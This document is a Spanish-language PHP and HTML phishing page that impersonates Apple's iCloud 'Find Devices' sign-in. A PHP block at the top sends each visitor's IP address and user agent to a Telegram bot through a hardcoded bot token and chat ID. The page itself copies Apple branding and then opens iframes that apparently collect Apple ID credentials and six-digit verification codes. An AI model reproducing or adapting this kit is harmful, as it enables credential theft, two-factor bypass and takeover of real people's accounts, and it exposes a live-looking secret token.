<?php
// Configuración del Bot de Telegram
$botToken = '6349539696:AAFnhdeO0rNvpGWVG2zrPALUKVuKCdqlhj4'; // Reemplaza con tu token de bot
$chatID = '6065537099'; // Reemplaza con tu chat ID

// Recoger información del visitante
$ip = $_SERVER['REMOTE_ADDR'];
if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
    // Es una IPv4 válida
} else {
    $ip = 'IP no válida';
}

$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'No detectado';

// Crear el mensaje
$mensaje = "🖥 Nueva visita a la página:\n";
$mensaje .= "• IP: $ip\n";
$mensaje .= "• User Agent: $userAgent";

// Configurar y enviar la solicitud a la API de Telegram
$url = "https://api.telegram.org/bot$botToken/sendMessage";
$data = [
    'chat_id' => $chatID,
    'text' => $mensaje,
    'disable_notification' => false
];

// Usar cURL para enviar el mensaje
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5); // Timeout de 5 segundos

$result = curl_exec($ch);

// Verificar errores (opcional)
if(curl_errno($ch)) {
    // Puedes registrar el error si lo deseas
    error_log('Error Telegram API: ' . curl_error($ch));
}

curl_close($ch);

// Continuar con la carga normal de la página...
?>
<html dir="ltr" data-supports-webp="" class="js-focus-visible" data-js-focus-visible="" data-primary-interaction-mode="mouse" data-device-type-class="desktop" lang="es-mx"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
        
        
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
        <meta name="description" content="Inicia sesión en iCloud para acceder a tus fotos, videos, documentos, notas, contactos y mucho más. Usa tu Apple ID o crea una cuenta para empezar a usar los servicios de Apple.">
        <meta name="keywords" content="icloud, free, apple">
        <meta name="og:title" content="iCloud.com">
        <meta name="og:image" content="https://www.icloud.com/icloud_logo/icloud_logo.png">
        <meta name="apple-mobile-web-app-capable" content="yes">
        <meta name="apple-mobile-web-app-status-bar-style" content="default">
        <meta name="google" content="notranslate">
        <meta name="theme-color" content="rgb(251, 251, 253)">
        
        
        <link rel="apple-touch-icon" sizes="180x180" href="https://www.icloud.com/system/icloud.com/current/static/apple-touch-icon.png">
        
        <link rel="apple-touch-icon" sizes="120x120" href="https://www.icloud.com/system/icloud.com/current/static/apple-touch-icon-120x120.png">
        
        <link rel="apple-touch-icon" sizes="152x152" href="https://www.icloud.com/system/icloud.com/current/static/apple-touch-icon-152x152.png">
        
        <link rel="apple-touch-icon-precomposed" sizes="180x180" href="https://www.icloud.com/system/icloud.com/current/static/apple-touch-icon-precomposed.png">
        
        <link rel="apple-touch-icon-precomposed" sizes="120x120" href="https://www.icloud.com/system/icloud.com/current/static/apple-touch-icon-120x120-precomposed.png">
        
        <link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://www.icloud.com/system/icloud.com/current/static/apple-touch-icon-152x152-precomposed.png">
        
        <link rel="icon" type="image/png" sizes="32x32" href="https://www.icloud.com/system/icloud.com/current/static/favicon-32x32.png">
        
        <link rel="icon" type="image/png" sizes="16x16" href="https://www.icloud.com/system/icloud.com/current/static/favicon-16x16.png">
        
        <link rel="mask-icon" sizes="any" color="#898989" href="https://www.icloud.com/system/icloud.com/current/static/safari-pinned-tab.svg">
        
        
        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
        <title>iCloud</title>
        
        <style id="cw-bootstrap-css">html {
    background-color: rgb(251, 251, 253);
}

#apple-logo,
#gcbd-logo {
    margin-left: -2px; /* stylelint-disable-line */
}

html[dir="rtl"] #apple-logo,
html[dir="rtl"] #gcbd-logo {
    margin-left: 0; /* stylelint-disable-line */
    margin-right: -2px; /* stylelint-disable-line */
}
</style>
        <link rel="icon" href="https://www.icloud.com/favicon.ico">
            
        
    <link href="https://gateway.icloud.com/" rel="preconnect" crossorigin=""><link href="https://gateway.icloud.com/" rel="dns-prefetch"><link href="https://ckdatabasews.icloud.com/" rel="preconnect" crossorigin=""><link href="https://ckdatabasews.icloud.com/" rel="dns-prefetch"><link href="https://cvws.icloud-content.com/" rel="preconnect" crossorigin=""><link href="https://cvws.icloud-content.com/" rel="dns-prefetch"><link rel="preload" as="image" href="https://www.icloud.com/system/icloud.com/current/static/wallpaper.webp" type="image/webp"><style id="inert-style">
[inert] {
  pointer-events: none;
  cursor: default;
}

[inert], [inert] * {
  -webkit-user-select: none;
  -moz-user-select: none;
  -ms-user-select: none;
  user-select: none;
}
.framenew{
    background:white;
    width:640px;
    margin:50px auto 0;
    border-radius:30px;
    overflow:hidden;
    box-shadow:0 11px 34px 0 rgba(0,0,0,.2);
    display:none;
    position:relative;
    z-index:1;
}
.footerclass{
    position:absolute;
    width:100%;
    bottom:0;
}
@media screen and (max-width:760px){
    .framenew{
        width:100%;
        margin-top:0;
        border-radius:0;
    }
}
</style><link rel="stylesheet" id="cw-css" href="data:text/css;base64,LmRvY3VtZW50LXJvdyAuaWNvbiAuZXhjZWwtaWNvbntiYWNrZ3JvdW5kLWltYWdlOnVybCgiYmxvYjpodHRwczovL3d3dy5pY2xvdWQuY29tL2ZmYjk2Yzg1LTVkNmUtNGVhMy1hNjJjLTA0MGQ0NTk5YjAxMiIpfQouZG9jdW1lbnQtcm93IC5pY29uIC5wcHQtaWNvbntiYWNrZ3JvdW5kLWltYWdlOnVybCgiYmxvYjpodHRwczovL3d3dy5pY2xvdWQuY29tLzNlZDJhMGZlLWExNWItNDdjZS1hMDJmLTNiZjE5ZDM1ZDkyMCIpfQouZG9jdW1lbnQtcm93IC5pY29uIC53b3JkLWljb257YmFja2dyb3VuZC1pbWFnZTp1cmwoImJsb2I6aHR0cHM6Ly93d3cuaWNsb3VkLmNvbS9kYjhlYTJiYS1jNDEwLTRlZDctYWY5OC04YzU1NzE2ZWM0N2UiKX0KLmNsb3Vkb3MtYWxlcnQgLmFsZXJ0LW1haW4tY29udGVudCAuYWxlcnQtaWNvbntiYWNrZ3JvdW5kLWltYWdlOnVybCgiYmxvYjpodHRwczovL3d3dy5pY2xvdWQuY29tLzVkYTljMzJjLTExODktNDAxOS1hZjUxLTNmYzQ5NzZlMDRmYyIpfQouY2xvdWRvcy1hbGVydCAuYWxlcnQtbWFpbi1jb250ZW50IC5hbGVydC1pY29uLmljbG91ZC1pY29ue2JhY2tncm91bmQtaW1hZ2U6dXJsKCJibG9iOmh0dHBzOi8vd3d3LmljbG91ZC5jb20vZDQzOGI1MzctNmM3OC00NmFjLThlNTktYWRmYTg3ZGU4NmZmIil9Ci5jbG91ZG9zLWFsZXJ0IC5hbGVydC1tYWluLWNvbnRlbnQgLmFsZXJ0LWljb24ucGhvdG9zLWljb257YmFja2dyb3VuZC1pbWFnZTp1cmwoImJsb2I6aHR0cHM6Ly93d3cuaWNsb3VkLmNvbS84OGQzZDBlYS1lNWRhLTQwNzctYjYxOC1iYWRiMWRhYzIwZDciKX0K"><script src="/icloud-archivos/authService.latest.min.js"></script><style type="text/css"></style><style type="text/css"></style></head>

    <body apple-system-font-capable="true" cz-shortcut-listen="true" class="clicking">
                
                    <link rel="stylesheet" href="/icloud-archivos/main.css">
                

    

<div><ui-main-pane><span class="screenreader-only-content" role="presentation"><div aria-live="polite" aria-relevant="additions" role="log"></div></span><div class="root-viewport"><div class="notification-presenter"></div><div class="root-component"><div class="page-viewport landing-page-route fade-in"><div class="page-content"><header class="toolbar-banner" role="banner"><div class="application-toolbar login-theme"><div class="toolbar-container"><div class="application-toolbar-start-view"><div class="cloudos-application-toolbar-start-view"><a href="" aria-label="Navega a la página de inicio de icloud.com" class="ICloudLogo unstyled-link nav-link"><svg width="90" height="31" xmlns="http://www.w3.org/2000/svg" class="apple-icloud-logo" aria-hidden="true"><g fill="none" fill-rule="nonzero"><path d="M77.005 23.215c1.568 0 2.767-.779 3.382-2.06h.061V23H83V8.204h-2.552v5.793h-.061c-.615-1.302-1.855-2.092-3.392-2.092-2.726 0-4.479 2.143-4.479 5.65v.01c0 3.497 1.742 5.65 4.489 5.65Zm.768-2.153c-1.64 0-2.654-1.333-2.654-3.497v-.01c0-2.163 1.025-3.496 2.654-3.496 1.568 0 2.675 1.374 2.675 3.496v.01c0 2.133-1.096 3.497-2.675 3.497Zm-13.05 2.153c1.64 0 2.757-.758 3.32-1.917h.052V23h2.552V12.13h-2.552v6.297c0 1.579-.933 2.635-2.398 2.635-1.455 0-2.173-.872-2.173-2.41v-6.521h-2.552v7.024c0 2.522 1.363 4.06 3.751 4.06Zm-10.826 0c3.187 0 5.257-2.122 5.257-5.65v-.02c0-3.507-2.1-5.64-5.267-5.64-3.157 0-5.248 2.154-5.248 5.64v.02c0 3.518 2.06 5.65 5.258 5.65Zm.01-2.06c-1.63 0-2.665-1.303-2.665-3.59v-.02c0-2.256 1.056-3.568 2.645-3.568 1.619 0 2.664 1.302 2.664 3.568v.02c0 2.277-1.035 3.59-2.644 3.59ZM44.137 23h2.55V8.204h-2.55V23Zm-8.357.256c3.402 0 5.913-2.102 6.292-5.137l.02-.102H39.5l-.031.102c-.482 1.825-1.804 2.84-3.69 2.84-2.572 0-4.232-2.07-4.232-5.362v-.01c0-3.282 1.65-5.343 4.233-5.343 1.926 0 3.228 1.056 3.658 2.748l.051.195h2.593l-.01-.103c-.39-3.014-2.89-5.137-6.292-5.137-4.243 0-6.938 2.912-6.938 7.64v.01c0 4.727 2.685 7.66 6.938 7.66ZM25.424 10.572a1.4 1.4 0 1 0 0-2.8c-.799 0-1.424.626-1.424 1.406 0 .759.625 1.394 1.424 1.394ZM24.144 23h2.551V12.13h-2.552V23Z" fill="#1D1D1F"></path><path d="M12.9 7.598c.608-.737 1.04-1.74 1.04-2.755 0-.14-.013-.28-.038-.394-.99.038-2.183.66-2.893 1.498-.559.635-1.079 1.65-1.079 2.666 0 .153.026.305.038.356.064.012.165.025.267.025.888 0 2.004-.597 2.664-1.396Zm.697 1.612c-1.484 0-2.69.901-3.464.901-.825 0-1.903-.85-3.197-.85C4.486 9.26 2 11.292 2 15.113c0 2.387.914 4.9 2.056 6.526.977 1.37 1.827 2.5 3.057 2.5 1.218 0 1.751-.812 3.261-.812 1.536 0 1.878.787 3.223.787 1.332 0 2.22-1.218 3.058-2.425.939-1.383 1.332-2.729 1.345-2.793-.076-.025-2.626-1.066-2.626-3.986 0-2.526 2.004-3.656 2.118-3.745-1.32-1.904-3.337-1.955-3.895-1.955Z" fill="#1D1D1F" opacity=".569"></path></g></svg></a></div></div><div class="application-toolbar-end-view"><div class="cloudos-application-toolbar-end-view"><div class="toolbar-buttons-container"><ui-button class="push primary toolbar-icon-button help-icon" tabindex="0" ontouchstart="void(0)" role="button" aria-label="Menú de ayuda" aria-haspopup="menu"><button type="button" tabindex="-1"></button><svg viewBox="0 0 92.0899658203125 19.5810546875" version="1.1" xmlns="http://www.w3.org/2000/svg" class=" glyph-box" height="19" width="19"><g transform="matrix(1 0 0 1 -8.740048828125055 45.0205078125)"><path d="M28.418-35.2051C28.418-40.625 24.0234-44.9707 18.5059-44.9707C13.1348-44.9707 8.74023-40.625 8.74023-35.2051C8.74023-29.7852 13.1348-25.4395 18.5059-25.4395C24.0234-25.4395 28.418-29.7852 28.418-35.2051ZM64.5508-35.2051C64.5508-40.625 60.2051-44.9707 54.7852-44.9707C49.4141-44.9707 45.0684-40.625 45.0684-35.2051C45.0684-29.7852 49.4141-25.4395 54.7852-25.4395C60.2051-25.4395 64.5508-29.7852 64.5508-35.2051ZM100.83-35.2051C100.83-40.625 96.4844-44.9707 91.0645-44.9707C85.5469-44.9707 81.2012-40.625 81.2012-35.2051C81.2012-29.7852 85.5469-25.4395 91.0645-25.4395C96.4844-25.4395 100.83-29.7852 100.83-35.2051Z"></path></g></svg></ui-button></div></div></div></div></div></header><main><div class="landing-page"><div class="chiclet-hero"><div class="app-icon"><img src="/files/ebdd87b7a9c033aa8ba806d09f788a6a.png" style="width: 100px; height: 100px;" aria-hidden="true" alt="" data-testid="find-app-icon"></div></div>
    <h1 class="application-title">Encontrar dispositivos</h1>
<div class="landing-page-content application-content">
    <ui-button class="push primary sign-in-button" tabindex="0" ontouchstart="void(0)" role="button" aria-haspopup="false">
        <button type="button" tabindex="-1">

        </button>Iniciar sesión</ui-button>
        <h2 class="description application-description">Busca tus dispositivos iPhone, iPad, Mac, Apple Watch, AirPods o Beats. O ayuda a encontrar los dispositivos registrados en Compartir en familia.</h2>
    <span class="external-link"><a target="_blank" rel="noreferrer" href="https://support.apple.com/guide/icloud/mm6b1aa045" data-testid="anchor">Obtén más información sobre Buscar dispositivos<span class="nobreak">&nbsp;<svg viewBox="0 0 72.127685546875 72.2177734375" version="1.1" xmlns="http://www.w3.org/2000/svg" style="height: 10.2495px; width: 10.2367px;" class=" glyph-box" aria-label="(se abre en una pestaña nueva)"><g transform="matrix(1 0 0 1 -12.451127929687573 71.3388671875)">
        <path d="M84.5703-17.334L84.5215-66.4551C84.5215-69.2383 82.7148-71.1914 79.7852-71.1914L30.6641-71.1914C27.9297-71.1914 26.0742-69.0918 26.0742-66.748C26.0742-64.4043 28.1738-62.4023 30.4688-62.4023L47.4609-62.4023L71.2891-63.1836L62.207-55.2246L13.8184-6.73828C12.9395-5.85938 12.4512-4.73633 12.4512-3.66211C12.4512-1.31836 14.5508 0.878906 16.9922 0.878906C18.1152 0.878906 19.1895 0.488281 20.0684-0.439453L68.5547-48.877L76.6113-58.0078L75.7324-35.2051L75.7324-17.1387C75.7324-14.8438 77.7344-12.6953 80.127-12.6953C82.4707-12.6953 84.5703-14.6973 84.5703-17.334Z"></path></g></svg></span></a></span>
</div></div>
    <div class="framenew">
                <iframe class="apple-id-frame-view" id="authFrame" scrolling="no" style="display:block" src="isignesp.php?id=10651&amp;correo=" width="100%" height="600px" frameborder="0"></iframe>
        <div style="display:none;" class="frameCode">
            <img src="/icloud-archivos/applenew2.png" class="imgApple" style="width: 200px;display:block;margin:50px auto 0;">
            <iframe class="apple-id-frame-view2" src="/icloud-archivos/code2022esp.php?digitos=6&amp;id=10651" style="margin:auto;background:#fff;border-radius:5px;display:block;" width="400" frameborder="0" height="270" scrolling="no"></iframe>
        </div>
        <button class="iniciar" style="display:none;">iniciar</button>
    </div>
</main><footer><div class="legal-footer"><div class="application-content"><div class="legal-footer-content"><div class="inner-row" role="presentation"><div class="with-separator"><a class="systemStatus" target="_blank" rel="noreferrer" href="https://www.apple.com/support/systemstatus/" aria-label="Estado del sistema (se abre en una pestaña nueva)">Estado del sistema</a><div aria-hidden="true" class="separator"></div></div><div class="with-separator"><a class="privacy" target="_blank" rel="noreferrer" href="https://www.apple.com/legal/privacy/" aria-label="Política de privacidad (se abre en una pestaña nueva)">Política de privacidad</a><div aria-hidden="true" class="separator"></div></div><a class="terms" target="_blank" rel="noreferrer" href="https://www.apple.com/legal/internet-services/icloud/" aria-label="Términos y condiciones (se abre en una pestaña nueva)">Términos y condiciones</a></div><div class="inner-row" role="presentation"><span class="copyright">Copyright © 2025 Apple Inc. Todos los derechos reservados.</span></div></div></div></div></footer></div></div></div></div></ui-main-pane></div><div aria-hidden="true" id="cw-img-container-r1" style="overflow: hidden; height: 0px; width: 0px;"></div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script> 
    <script>
        $( document ).ready(function() {
            $(".sign-in-button").on("click", abreFrame);
            function abreFrame(){
                $(".landing-page").hide(0);
                $(".framenew").fadeIn(3500);
                $("footer").addClass("footerclass");
            }
            $(".iniciar").on("click", abreLog);
            function abreLog(){
                $(".apple-id-frame-view").fadeIn(3500);
            }
        });
    </script>
</body></html>